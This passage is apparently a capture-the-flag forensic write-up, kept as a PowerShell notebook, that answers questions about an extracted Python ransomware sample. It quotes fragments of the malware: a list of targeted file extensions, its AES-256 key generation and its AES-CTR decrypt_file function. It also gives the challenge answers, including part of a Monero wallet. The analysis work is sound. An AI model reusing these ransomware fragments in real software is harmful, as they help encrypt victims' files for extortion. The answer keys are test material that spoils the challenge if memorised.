      "        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code\n",
      "        'java', 'class', 'jar', # java source code\n",
      "        'ps', 'bat', 'vb', # windows based scripts\n",
      "        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts\n",
      "        'go', 'pyc', 'bf', 'coffee', # other source code files\n",
      "\n",
      "        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats\n",
      "    ] \n"
     ]
    }
   ],
   "source": [
    "Get-Content \"..\\aisoudfwemidf.exe_extracted\\ransomware\" -First 30"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Notice \"import base64\", this gives a hint that the file probably has a base64 encoded object in it. Knowing that the base64 code is long, open the `ransomware` file in sublime text:\n",
    "\n",
    "![Heren](pics/Heren9-1.png)\n",
    "\n",
    "Below the base64 encoded object, there is a a function called \"def set_wallpaper():\"\n",
    "\n",
    "#### Answer: base64"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 10</font>\n",
    "\n",
    "What type of the encryption does this ransomware use to encrypt a user's files? Don't include the mode of encryption. Include the key bit length in the encryption type if it is standard.\n",
    "\n",
    "### Solution\n",
    "\n",
    "Open the `ransomware` file from Herensuge 9\n",
    "\n",
    "Scroll down until you notice the *encrypt_file* function. Reviewing this function you'll notice that *AES.new* references a variable named *key*.\n",
    "\n",
    "![Heren](pics/Heren10-1.png)\n",
    "\n",
    "Use the following command to locate the *key* variable:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "C:\\Users\\Administrator\\Artifacts\\aisoudfwemidf.exe_extracted\\ransomware:86: \n",
      "       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, \n",
      "C:\\Users\\Administrator\\Artifacts\\aisoudfwemidf.exe_extracted\\ransomware:96: \n",
      "       registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0,\n",
      "C:\\Users\\Administrator\\Artifacts\\aisoudfwemidf.exe_extracted\\ransomware:107:\n",
      "    key = os.urandom(32) # bytes object for encryption\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "Select-String -Path \"..\\aisoudfwemidf.exe_extracted\\ransomware\" -Pattern \"key =\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After locating the variable *key*, you'll notice that it uses 32 bytes which is 256 bits.\n",
    "\n",
    "\n",
    "#### Answer:  AES256"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 11</font>\n",
    "\n",
    "What are the first 8 characters of the Monero wallet owned by the hackers?\n",
    "\n",
    "### Solution\n",
    "\n",
    "Open the `ransomware` file from Herensuge 9 that contained the base64 encoded wallpaper. Copy and decode the base64 using CyberChef:\n",
    "\n",
    "![Heren](pics/Heren9-1.png)\n",
    "\n",
    "![Heren](pics/Heren11-1.png)\n",
    "\n",
    "Download the file as a .png and open it. You'll notice the Monero wallet code at the bottom:\n",
    "\n",
    "![Heren](pics/Heren38.png)\n",
    "\n",
    "#### Answer: 42Sngtiq"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <font color=green>Herensuge 12</font>\n",
    "\n",
    "What function was accidentally run in the first version of the ransomware sent by Hektor Elizondo (helizondo)? Give just the name of the function without parenthesis or parameters.\n",
    "\n",
    "### Solution\n",
    "\n",
    "Analyze the `ransomware` file in sublime. The file has a function called *decrypt_file*, the command below displays the function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "def decrypt_file(new_file, filename, key, counter_start, blocksize = 32):\n",
      "\n",
      "    ctr = Counter.new(128, initial_value=counter_start)\n",
      "    decrypto = AES.new(key, AES.MODE_CTR, counter = ctr).decrypt\n",
      "    f = open(filename, 'rb')\n",
      "    decrypted_file = open(new_file, 'wb')\n",
      "    plaintext = f.read(blocksize)\n",
      "    while plaintext:\n",
      "        ciphertext = decrypto(plaintext)\n",
      "        if len(plaintext) != len(ciphertext):\n",
      "            raise ValueError('''Ciphertext ({}) is not of the same length\n",
      "                of the Plaintext ({}).\n",
      "                Not a stream Cipher.'''.format(len(ciphertext), len(plaintext)))\n",
      "\n",
      "        decrypted_file.write(ciphertext)\n",
      "        plaintext = f.read(blocksize)\n",
      "    f.close()\n",
      "    decrypted_file.close()\n"
     ]
    }
   ],
   "source": [
    "Get-Content \"../aisoudfwemidf.exe_extracted/ransomware\" | select -Last 19 -skip 70"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This function had no logic statements and was run after the *encrypt_file* function. This caused the files to decrypt after being encrypted.  \n",
    "\n",
    "#### Answer: decrypt_file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PowerShell",
   "language": "powershell",
   "name": "powershell"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".ps1",
   "mimetype": "text/x-sh",
   "name": "powershell"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
